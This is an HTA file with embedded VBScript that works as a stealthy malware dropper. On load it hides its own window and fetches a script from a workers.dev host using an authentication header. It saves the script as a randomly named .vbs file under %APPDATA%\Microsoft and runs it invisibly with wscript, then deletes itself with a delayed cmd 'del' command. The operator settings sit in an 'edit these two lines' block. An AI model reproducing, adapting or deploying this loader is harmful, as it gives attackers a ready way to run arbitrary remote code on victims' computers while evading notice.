<html>
<head><title>.</title>
<hta:application id="a"
  border="none" innerborder="no" caption="no"
  showintaskbar="no" sysmenu="no" contextmenu="no"
  selection="no" scroll="no" singleinstance="yes"
  windowstate="minimize"/>
<script language="VBScript">
On Error Resume Next

' ==== EDIT THESE TWO LINES ====
Const WH    = "https://panel.internationshop1.workers.dev/"
Const XAUTH = "lxgcute"
' ==============================

Dim sh, fso
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Sub Window_OnLoad()
  window.resizeTo 0, 0
  window.moveTo -2000, -2000
  FetchAndRun()
End Sub

Sub FetchAndRun()
  Dim xh, body
  Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  xh.SetOption 2, 13056
  xh.SetTimeouts 5000, 5000, 10000, 15000
  xh.Open "GET", WH & "s2", False
  xh.SetRequestHeader "x-auth", XAUTH
  xh.Send
  If xh.Status <> 200 Then
    window.close
    Exit Sub
  End If
  body = xh.responseText
  Set xh = Nothing
  If Len(body) < 200 Then
    window.close
    Exit Sub
  End If

  Dim path
  path = sh.ExpandEnvironmentStrings("%APPDATA%\Microsoft\") & "sys_" & RandHex(6) & ".vbs"
  Dim f
  Set f = fso.CreateTextFile(path, True, False)
  f.Write body
  f.Close
  Set f = Nothing

  sh.Run "wscript.exe """ & path & """", 0, False

  window.setTimeout "SelfDeleteAndClose", 2000, "VBScript"
End Sub

Sub SelfDeleteAndClose()
  SelfDelete()
  window.close
End Sub

Function RandHex(n)
  Dim s, i, c
  Randomize
  s = ""
  For i = 1 To n
    c = Int(Rnd() * 16)
    s = s & Mid("0123456789abcdef", c + 1, 1)
  Next
  RandHex = s
End Function

Sub SelfDelete()
  Dim cmd, p
  p = location.href
  If InStr(LCase(p), "file:///") <> 1 Then Exit Sub
  p = Mid(p, 9)
  p = Replace(p, "/", "\")
  p = Replace(p, "%20", " ")
  cmd = "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & p & """"
  sh.Run cmd, 0, False
End Sub
</script>
</head>
<body></body>
</html>
